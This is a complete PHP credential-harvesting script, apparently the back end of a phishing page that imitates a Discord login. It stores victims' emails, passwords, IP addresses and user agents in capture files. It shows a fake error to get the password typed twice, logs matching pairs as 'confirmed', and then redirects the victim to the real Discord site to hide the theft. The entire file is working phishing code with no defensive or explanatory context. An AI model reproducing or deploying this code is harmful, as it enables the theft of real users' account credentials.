<?php
session_start();
$platform = 'discord';
$code = 'DIS';
$dir = '../../captures/' . $code;
if (!file_exists($dir)) mkdir($dir, 0755, true);
$ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
$ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
$attempt = $_POST['attempt'] ?? '1';
$email = ''; $pass = '';
foreach ($_POST as $k => $v) {
    if ($k == 'platform' || $k == 'attempt') continue;
    if (stripos($k, 'pass') !== false) $pass = $v;
    elseif (stripos($k, 'user') !== false || stripos($k, 'email') !== false) $email = $v;
}
if (empty($email) && isset($_POST['email'])) $email = $_POST['email'];
if (empty($pass) && isset($_POST['pass'])) $pass = $_POST['pass'];
$file = $dir . '/' . $code . '_' . date('Ymd_His') . '_attempt' . $attempt . '.txt';
$content = "PLATFORM: $platform\nEMAIL: $email\nPASSWORD: $pass\nIP: $ip\nUA: $ua\n";
file_put_contents($file, $content, FILE_APPEND);
if ($attempt == '1') {
    $_SESSION['email'] = $email;
    $_SESSION['pass1'] = $pass;
    header('Location: index.html?error=1&email=' . urlencode($email));
} else {
    if ($pass === ($_SESSION['pass1'] ?? '')) {
        file_put_contents($dir . '/CONFIRMED_SUMMARY.txt', "✅ $email | $pass | " . date('Y-m-d H:i:s') . "\n", FILE_APPEND);
    }
    session_destroy();
    $url = 'https://www.' . $platform . '.com';
    header('Location: ' . $url);
}
exit;
?>